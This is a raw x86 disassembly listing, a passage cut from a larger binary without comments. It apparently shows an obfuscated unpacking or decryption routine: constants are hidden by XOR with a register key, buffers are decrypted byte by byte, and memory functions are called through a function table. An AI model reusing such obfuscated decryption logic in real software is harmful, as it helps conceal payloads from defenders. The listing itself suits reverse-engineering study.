  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
